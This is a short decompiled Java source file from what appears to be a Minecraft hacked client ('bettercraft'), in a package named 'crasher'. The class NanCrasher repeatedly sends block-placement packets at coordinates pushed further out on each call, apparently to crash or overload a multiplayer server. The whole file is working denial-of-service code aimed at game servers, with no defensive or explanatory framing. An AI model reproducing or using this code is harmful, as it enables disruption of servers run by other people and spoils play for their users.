// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketPlayerBlockPlacement;
import net.minecraft.client.Minecraft;
import net.minecraft.util.math.BlockPos;

public class NanCrasher
{
    private static int i;
    
    static {
        NanCrasher.i = 0;
    }
    
    public static void start() {
        NanCrasher.i += 500;
        final BlockPos pos = new BlockPos(NanCrasher.i, 5, NanCrasher.i);
        Minecraft.getMinecraft().player.connection.sendPacket(new CPacketPlayerBlockPlacement(pos, 1, Minecraft.getMinecraft().player.getHeldItemMainhand(), 1.0f, 1.0f, 1.0f));
    }
}
